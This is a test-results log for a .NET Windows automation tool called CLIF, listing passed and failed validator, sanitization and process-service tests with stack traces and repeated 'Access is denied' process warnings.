    <UnitTestResult executionId="92d3f54a-d6ad-4076-9af3-485e529f7a20" testId="108830f9-8175-f73e-a6a9-011815027e40" testName="CLIF.Tests.Unit.Security.SanitizationHelperTests.SanitizeTextInput_WithSafeInput_ShouldReturnUnchanged(input: &quot;Hello World&quot;, expected: &quot;Hello World&quot;)" computerName="MC-HR-128" duration="00:00:00.0000191" startTime="2025-11-01T16:15:11.9927906-04:00" endTime="2025-11-01T16:15:11.9929077-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="92d3f54a-d6ad-4076-9af3-485e529f7a20" />
    <UnitTestResult executionId="b2c97cd8-0117-4a9b-86b4-d3c531ba4fc3" testId="b9be0ae1-dead-4258-e332-8d00ff472189" testName="CLIF.Tests.Unit.Security.SecurityContextTests.IsElevated_ShouldReturnBooleanValue" computerName="MC-HR-128" duration="00:00:00.0006945" startTime="2025-11-01T16:15:11.9511179-04:00" endTime="2025-11-01T16:15:11.9513388-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="b2c97cd8-0117-4a9b-86b4-d3c531ba4fc3" />
    <UnitTestResult executionId="36d63e45-8790-42e7-995c-b00a9a10bccc" testId="6ad2fee9-d20d-71e1-0b4b-c09fc4d31140" testName="CLIF.Tests.Integration.ValidationHarnessTests.ElementSelectorValidator_WithValidSelectors_ShouldPass(selector: &quot;class=ButtonClass&quot;)" computerName="MC-HR-128" duration="00:00:00.0000172" startTime="2025-11-01T16:15:12.8592878-04:00" endTime="2025-11-01T16:15:12.8594180-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="36d63e45-8790-42e7-995c-b00a9a10bccc" />
    <UnitTestResult executionId="ae46fb1b-4bc9-4655-b6a1-3e55f4be2290" testId="c0f50b78-0532-92d5-aaf2-d53f955e7ff2" testName="CLIF.Tests.Integration.ValidationHarnessTests.FilePathValidator_WithValidPaths_ShouldPass(path: &quot;./relative/path/script.json&quot;)" computerName="MC-HR-128" duration="00:00:00.0017411" startTime="2025-11-01T16:15:12.8617292-04:00" endTime="2025-11-01T16:15:12.8623355-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="ae46fb1b-4bc9-4655-b6a1-3e55f4be2290">
      <Output>
        <ErrorInfo>
          <Message>Expected result.IsValid to be True, but found False.</Message>
          <StackTrace>   at FluentAssertions.Execution.LateBoundTestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.AddPreFormattedFailure(String formattedFailureMessage)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.BooleanAssertions`1.BeTrue(String because, Object[] becauseArgs)&#xD;
   at CLIF.Tests.Integration.ValidationHarnessTests.FilePathValidator_WithValidPaths_ShouldPass(String path) in c:\Users\Chris\clif\CLIF.Tests\Integration\ValidationHarnessTests.cs:line 98&#xD;
   at System.RuntimeMethodHandle.InvokeMethod(Object target, Void** arguments, Signature sig, Boolean isConstructor)&#xD;
   at System.Reflection.MethodBaseInvoker.InvokeDirectByRefWithFewArgs(Object obj, Span`1 copyOfArgs, BindingFlags invokeAttr)</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="2a57e773-e133-4dcc-811a-a070485ed263" testId="91e07c12-191a-2368-c749-845f91600550" testName="CLIF.Tests.Unit.Commands.ScriptCommandTests.Command_ShouldHaveScriptFileArgument" computerName="MC-HR-128" duration="00:00:00.0010707" startTime="2025-11-01T16:15:12.7350781-04:00" endTime="2025-11-01T16:15:12.7356581-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="2a57e773-e133-4dcc-811a-a070485ed263" />
    <UnitTestResult executionId="9cbfaac5-395d-4283-8ad8-ced9cb5462d9" testId="cf923bcf-4fa3-7abc-c2d6-9516e59e4307" testName="CLIF.Tests.Unit.Services.ScriptServiceTests.ExecuteScriptAsync_WithNonExistentFile_ShouldReturnFailure" computerName="MC-HR-128" duration="00:00:00.0048341" startTime="2025-11-01T16:15:13.0883014-04:00" endTime="2025-11-01T16:15:13.0916483-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="9cbfaac5-395d-4283-8ad8-ced9cb5462d9" />
    <UnitTestResult executionId="9378d5b0-8a31-41e2-bad0-02d97b65890d" testId="42c23a76-7f93-8af5-6563-22f6ff37f370" testName="CLIF.Tests.Unit.Commands.InteractCommandTests.Command_ShouldHaveRequiredOptions" computerName="MC-HR-128" duration="00:00:00.0182140" startTime="2025-11-01T16:15:12.5100507-04:00" endTime="2025-11-01T16:15:12.5277910-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="9378d5b0-8a31-41e2-bad0-02d97b65890d" />
    <UnitTestResult executionId="e8730dd1-5359-4ea5-b52d-f43a4d94b89a" testId="d01bc78e-7500-b2c2-8833-e13711a69f26" testName="CLIF.Tests.Integration.ValidationHarnessTests.ElementSelectorValidator_WithValidSelectors_ShouldPass(selector: &quot;name=Submit&quot;)" computerName="MC-HR-128" duration="00:00:00.0002709" startTime="2025-11-01T16:15:12.8559901-04:00" endTime="2025-11-01T16:15:12.8560880-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="e8730dd1-5359-4ea5-b52d-f43a4d94b89a" />
    <UnitTestResult executionId="30c467f3-d77f-4d09-80c9-673ebb4264f9" testId="5ed126d7-940f-fc67-e612-0d3ef1548d23" testName="CLIF.Tests.Unit.Security.SanitizationHelperTests.SanitizeTextInput_WithWhitespaceOnly_ShouldPreserveWhitespace(whitespaceInput: &quot;   whitespace   &quot;)" computerName="MC-HR-128" duration="00:00:00.0015089" startTime="2025-11-01T16:15:11.9786603-04:00" endTime="2025-11-01T16:15:11.9787713-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="30c467f3-d77f-4d09-80c9-673ebb4264f9" />
    <UnitTestResult executionId="82822d2f-e230-4dfc-b085-02252353c0e1" testId="aefed11c-4000-85a6-7c90-8289ecc89e58" testName="CLIF.Tests.Unit.Validation.ValidationResultTests.Failure_WithNullMessage_ShouldUseEmptyString" computerName="MC-HR-128" duration="00:00:00.0036125" startTime="2025-11-01T16:15:12.5272522-04:00" endTime="2025-11-01T16:15:12.5535949-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="82822d2f-e230-4dfc-b085-02252353c0e1">
      <Output>
        <ErrorInfo>
          <Message>System.NullReferenceException : Object reference not set to an instance of an object.</Message>
          <StackTrace>   at CLIF.Validation.ValidationResult.&lt;&gt;c.&lt;get_ErrorMessage&gt;b__6_0(ValidationError e) in c:\Users\Chris\clif\CLIF\Validation\ValidationResult.cs:line 27&#xD;
   at System.Linq.Enumerable.SelectListIterator`2.MoveNext()&#xD;
   at System.String.Join(String separator, IEnumerable`1 values)&#xD;
   at CLIF.Validation.ValidationResult.get_ErrorMessage() in c:\Users\Chris\clif\CLIF\Validation\ValidationResult.cs:line 27&#xD;
   at CLIF.Tests.Unit.Validation.ValidationResultTests.Failure_WithNullMessage_ShouldUseEmptyString() in c:\Users\Chris\clif\CLIF.Tests\Unit\Validation\ValidationResultTests.cs:line 46&#xD;
   at System.RuntimeMethodHandle.InvokeMethod(Object target, Void** arguments, Signature sig, Boolean isConstructor)&#xD;
   at System.Reflection.MethodBaseInvoker.InvokeWithNoArgs(Object obj, BindingFlags invokeAttr)</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="07eb151b-e785-4aca-8953-9088e667f26b" testId="b011cab7-2819-3c16-d8a2-44e9f1803127" testName="CLIF.Tests.Integration.ValidationHarnessTests.ElementSelectorValidator_WithDifferentPrefixes_ShouldRecognizeFormat(selector: &quot;name=Submit Button&quot;)" computerName="MC-HR-128" duration="00:00:00.0000124" startTime="2025-11-01T16:15:12.8508097-04:00" endTime="2025-11-01T16:15:12.8509172-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="07eb151b-e785-4aca-8953-9088e667f26b" />
    <UnitTestResult executionId="f936af13-820b-4c5a-a5ae-e4e358d80cf2" testId="a3d4045e-13a3-b1a1-cf77-df4bfd1196ab" testName="CLIF.Tests.Unit.Security.SecurityContextTests.IsAdministrator_ShouldReturnBooleanValue" computerName="MC-HR-128" duration="00:00:00.7912699" startTime="2025-11-01T16:15:11.1766013-04:00" endTime="2025-11-01T16:15:11.9291997-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="f936af13-820b-4c5a-a5ae-e4e358d80cf2" />
    <UnitTestResult executionId="6340621f-152b-43e7-b1db-6f4fa3168503" testId="7a99cec7-f8e1-feb1-f3d6-506917f1440d" testName="CLIF.Tests.Unit.Services.ProcessServiceTests.FindProcessByWindowTitleAsync_WithNullTitle_ShouldThrowArgumentNullException" computerName="MC-HR-128" duration="00:00:01.0409668" startTime="2025-11-01T16:15:17.3514470-04:00" endTime="2025-11-01T16:15:18.3925970-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="6340621f-152b-43e7-b1db-6f4fa3168503" />
    <UnitTestResult executionId="4c455ae7-28a2-43bf-9891-0142630bec23" testId="ba52064c-78dd-1c8e-7e26-5cbbc3e0afe1" testName="CLIF.Tests.Integration.ValidationHarnessTests.ProcessIdValidator_WithValidProcessIds_ShouldPass(processId: 1234)" computerName="MC-HR-128" duration="00:00:00.0018936" startTime="2025-11-01T16:15:12.7376570-04:00" endTime="2025-11-01T16:15:12.7377541-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="4c455ae7-28a2-43bf-9891-0142630bec23">
      <Output>
        <ErrorInfo>
          <Message>Expected result.IsValid to be True, but found False.</Message>
          <StackTrace>   at FluentAssertions.Execution.LateBoundTestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.AddPreFormattedFailure(String formattedFailureMessage)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.BooleanAssertions`1.BeTrue(String because, Object[] becauseArgs)&#xD;
   at CLIF.Tests.Integration.ValidationHarnessTests.ProcessIdValidator_WithValidProcessIds_ShouldPass(Int32 processId) in c:\Users\Chris\clif\CLIF.Tests\Integration\ValidationHarnessTests.cs:line 27&#xD;
   at InvokeStub_ValidationHarnessTests.ProcessIdValidator_WithValidProcessIds_ShouldPass(Object, Span`1)&#xD;
   at System.Reflection.MethodBaseInvoker.InvokeWithOneArg(Object obj, BindingFlags invokeAttr, Binder binder, Object[] parameters, CultureInfo culture)</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="2026dfb2-e969-48d1-be07-e0ed719dfb82" testId="b1a5eaa2-b00c-7aaf-16f5-5abd46633feb" testName="CLIF.Tests.Unit.Security.SecurityContextTests.ValidateFileAccess_WithRestrictedPaths_ShouldHandleGracefully(restrictedPath: &quot;C:\\Program Files&quot;)" computerName="MC-HR-128" duration="00:00:00.0005042" startTime="2025-11-01T16:15:11.9803395-04:00" endTime="2025-11-01T16:15:11.9845479-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="2026dfb2-e969-48d1-be07-e0ed719dfb82" />
    <UnitTestResult executionId="1804f31e-d99d-432b-a8ed-8de1dc22de8a" testId="5ae4ac12-d90e-734d-86f4-0d4b72a50baa" testName="CLIF.Tests.Unit.Commands.ScriptCommandTests.Constructor_ShouldCreateValidCommand" computerName="MC-HR-128" duration="00:00:00.0004918" startTime="2025-11-01T16:15:12.7359247-04:00" endTime="2025-11-01T16:15:12.7360253-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="1804f31e-d99d-432b-a8ed-8de1dc22de8a" />
    <UnitTestResult executionId="a0d57203-c4cc-44e9-9845-abd9bf97e3c7" testId="d1d786e8-9bc3-381b-5b9d-f92b96d27142" testName="CLIF.Tests.Unit.Security.SanitizationHelperTests.SanitizeTextInput_WithSafeInput_ShouldReturnUnchanged(input: &quot;Test123&quot;, expected: &quot;Test123&quot;)" computerName="MC-HR-128" duration="00:00:00.0001856" startTime="2025-11-01T16:15:11.9859230-04:00" endTime="2025-11-01T16:15:11.9860407-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="a0d57203-c4cc-44e9-9845-abd9bf97e3c7" />
    <UnitTestResult executionId="ea10004b-bed9-4192-86e3-954abf8e235f" testId="b28effdd-b029-49b7-0857-9b997d31bf4c" testName="CLIF.Tests.Unit.Commands.TreeCommandTests.Command_ShouldBePartOfCommandSystem" computerName="MC-HR-128" duration="00:00:00.0010777" startTime="2025-11-01T16:15:12.5100067-04:00" endTime="2025-11-01T16:15:12.5105685-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="ea10004b-bed9-4192-86e3-954abf8e235f" />
    <UnitTestResult executionId="635ea734-7321-48a5-9e03-f746188ed8d0" testId="e553b534-b158-c775-58b6-f6c46dd65e12" testName="CLIF.Tests.Unit.Validation.ProcessIdValidatorTests.Validate_WithNegativeProcessId_ShouldReturnFailure" computerName="MC-HR-128" duration="00:00:00.0014591" startTime="2025-11-01T16:15:12.0001091-04:00" endTime="2025-11-01T16:15:12.0002030-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="635ea734-7321-48a5-9e03-f746188ed8d0" />
    <UnitTestResult executionId="61a17e97-ac7c-4888-96ac-9a9e3865ef90" testId="ea78de42-b7ec-0b07-d30c-e868df503a8d" testName="CLIF.Tests.Unit.Services.InteractiveServiceTests.ExecuteCommandAsync_WithVariousCommands_ShouldHandleGracefully(command: &quot;tree&quot;)" computerName="MC-HR-128" duration="00:00:00.0031170" startTime="2025-11-01T16:15:12.6554857-04:00" endTime="2025-11-01T16:15:12.6613315-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="61a17e97-ac7c-4888-96ac-9a9e3865ef90">
      <Output>
        <ErrorInfo>
          <Message>Expected result to be True, but found False.</Message>
          <StackTrace>   at FluentAssertions.Execution.LateBoundTestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.AddPreFormattedFailure(String formattedFailureMessage)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.BooleanAssertions`1.BeTrue(String because, Object[] becauseArgs)&#xD;
   at CLIF.Tests.Unit.Services.InteractiveServiceTests.ExecuteCommandAsync_WithVariousCommands_ShouldHandleGracefully(String command) in c:\Users\Chris\clif\CLIF.Tests\Unit\Services\InteractiveServiceTests.cs:line 103&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="e1bb1cad-1907-46b9-9a99-7d7a6c19d456" testId="51e7b309-3c2a-d5c7-b834-a4c923948bb0" testName="CLIF.Tests.Unit.Services.ProcessServiceTests.FindProcessByNameAsync_WithEmptyOrNullName_ShouldReturnNull(processName: &quot;&quot;)" computerName="MC-HR-128" duration="00:00:01.0421655" startTime="2025-11-01T16:15:13.8909560-04:00" endTime="2025-11-01T16:15:14.9335586-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="e1bb1cad-1907-46b9-9a99-7d7a6c19d456" />
    <UnitTestResult executionId="31c43209-319a-445d-8adb-a3e68b402402" testId="986fa77e-875e-3d51-3915-bcb7f03fdd47" testName="CLIF.Tests.Unit.Validation.TextInputValidatorTests.Validate_WithValidText_ShouldReturnSuccess(text: &quot;Valid input text&quot;)" computerName="MC-HR-128" duration="00:00:00.0002742" startTime="2025-11-01T16:15:12.5806842-04:00" endTime="2025-11-01T16:15:12.5808082-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="31c43209-319a-445d-8adb-a3e68b402402" />
    <UnitTestResult executionId="4de1eb9f-c774-4f38-ad64-7f3daec6b689" testId="640fe4bf-b56e-2d90-bd09-3dc0f73f5466" testName="CLIF.Tests.Unit.Validation.FilePathValidatorTests.Validate_WithNullPath_ShouldReturnFailure" computerName="MC-HR-128" duration="00:00:00.0026798" startTime="2025-11-01T16:15:12.6224019-04:00" endTime="2025-11-01T16:15:12.6225037-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="4de1eb9f-c774-4f38-ad64-7f3daec6b689">
      <Output>
        <ErrorInfo>
          <Message>Expected result.ErrorMessage "File path cannot be empty" to contain "File path cannot be null".</Message>
          <StackTrace>   at FluentAssertions.Execution.LateBoundTestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.AddPreFormattedFailure(String formattedFailureMessage)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.StringAssertions`1.Contain(String expected, String because, Object[] becauseArgs)&#xD;
   at CLIF.Tests.Unit.Validation.FilePathValidatorTests.Validate_WithNullPath_ShouldReturnFailure() in c:\Users\Chris\clif\CLIF.Tests\Unit\Validation\FilePathValidatorTests.cs:line 82&#xD;
   at System.RuntimeMethodHandle.InvokeMethod(Object target, Void** arguments, Signature sig, Boolean isConstructor)&#xD;
   at System.Reflection.MethodBaseInvoker.InvokeWithNoArgs(Object obj, BindingFlags invokeAttr)</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="145cd955-58d7-4f24-a35e-aa7d4a9a7ec7" testId="4528aa8c-9b83-fe6f-4767-19096fb6780c" testName="CLIF.Tests.Unit.Services.SessionCaptureServiceTests.EndSessionAsync_ShouldClearSessionProperties" computerName="MC-HR-128" duration="00:00:00.0500106" startTime="2025-11-01T16:15:13.2768923-04:00" endTime="2025-11-01T16:15:13.3556474-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="145cd955-58d7-4f24-a35e-aa7d4a9a7ec7" />
    <UnitTestResult executionId="c5943792-dfc6-4bcf-b0dd-9fd9e58988b5" testId="927aab83-95f1-22e6-8bc8-e6f981211f5f" testName="CLIF.Tests.Unit.Commands.InteractCommandTests.InvokeAsync_WithMissingRequiredOptions_ShouldFail" computerName="MC-HR-128" duration="00:00:01.3809939" startTime="2025-11-01T16:15:11.1743555-04:00" endTime="2025-11-01T16:15:12.5095383-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="c5943792-dfc6-4bcf-b0dd-9fd9e58988b5" />
    <UnitTestResult executionId="69a4a875-8767-4e84-ba7a-8453fd28ab4b" testId="2edc9a95-c079-af3b-1e2e-96b928ae0f23" testName="CLIF.Tests.Unit.Services.InteractiveServiceTests.ExecuteCommandAsync_WithAttachCommand_WithInvalidPid_ShouldReturnFalse" computerName="MC-HR-128" duration="00:00:00.0023111" startTime="2025-11-01T16:15:12.9402499-04:00" endTime="2025-11-01T16:15:12.9409831-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="69a4a875-8767-4e84-ba7a-8453fd28ab4b" />
    <UnitTestResult executionId="f9380430-1078-4e2c-8ffb-69382aabb82e" testId="fb4a724c-737e-a02d-f5e5-795e7287fd20" testName="CLIF.Tests.Unit.Services.SessionCaptureServiceTests.SetTargetWindow_ShouldNotThrow" computerName="MC-HR-128" duration="00:00:00.0004929" startTime="2025-11-01T16:15:13.5748970-04:00" endTime="2025-11-01T16:15:13.5751532-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="f9380430-1078-4e2c-8ffb-69382aabb82e" />
    <UnitTestResult executionId="98bc0ebf-b53d-40cd-a629-6254920f1e1f" testId="c56ccc27-b6ea-db68-11b8-cb9d96bf12d6" testName="CLIF.Tests.InfrastructureTests.SecurityContext_ShouldBeAccessibleAsSingleton" computerName="MC-HR-128" duration="00:00:00.0002456" startTime="2025-11-01T16:15:12.7296341-04:00" endTime="2025-11-01T16:15:12.7297498-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="98bc0ebf-b53d-40cd-a629-6254920f1e1f" />
    <UnitTestResult executionId="3782bb93-74cf-48d2-87a3-c5dca1de59d6" testId="c5f9f91b-0284-c667-aedd-dd8346bbef09" testName="CLIF.Tests.Unit.Services.InteractiveServiceTests.ExecuteCommandAsync_WithVariousCommands_ShouldHandleGracefully(command: &quot;screenshot&quot;)" computerName="MC-HR-128" duration="00:00:00.0953428" startTime="2025-11-01T16:15:12.5732901-04:00" endTime="2025-11-01T16:15:12.6552685-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="3782bb93-74cf-48d2-87a3-c5dca1de59d6" />
    <UnitTestResult executionId="5ba7fcc9-e78b-400e-b1b8-fda2fdaa0db9" testId="3ad014a3-3532-44aa-27bd-5d8b516235a7" testName="CLIF.Tests.Unit.Validation.TextInputValidatorTests.Validate_WithTextExceedingMaximumLength_ShouldReturnFailure(longText: &quot;This is a test of the emergency broadcast system. &quot;···)" computerName="MC-HR-128" duration="00:00:00.0048994" startTime="2025-11-01T16:15:12.5750557-04:00" endTime="2025-11-01T16:15:12.5751916-04:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="5ba7fcc9-e78b-400e-b1b8-fda2fdaa0db9">
      <Output>
        <ErrorInfo>
          <Message>Expected result.IsValid to be False, but found True.</Message>
          <StackTrace>   at FluentAssertions.Execution.LateBoundTestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.AddPreFormattedFailure(String formattedFailureMessage)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(Func`1 getFailureReason)&#xD;
   at FluentAssertions.Execution.AssertionChain.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.BooleanAssertions`1.BeFalse(String because, Object[] becauseArgs)&#xD;
[...]
      Failed to process msedge: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process msedge: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process jucheck: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process msedge: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process SystemSettingsBroker: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process svchost: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process svchost: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process msedge: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process msedgewebview2: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process msedgewebview2: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process msedgewebview2: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process msedgewebview2: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process msedgewebview2: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process msedgewebview2: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process ms-teams_modulehost: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process msedgewebview2: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process LogonUI: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process TabTip: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process OneDrive: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process OneDrive.Sync.Service: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process taskhostw: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process svchost: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process CCXProcess: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process node: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process conhost: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process ms-teamsupdate: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process tailscaled: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process tailscaled: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process tailscale-ipn: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process svchost: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process msrdc: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process msedge: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process svchost: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process msedge: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process msedge: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process WmiPrvSE: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process svchost: Access is denied.&#xD;
warn: CLIF.Services.ProcessService[0]&#xD;
      Failed to process svchost: Access is denied.&#xD;
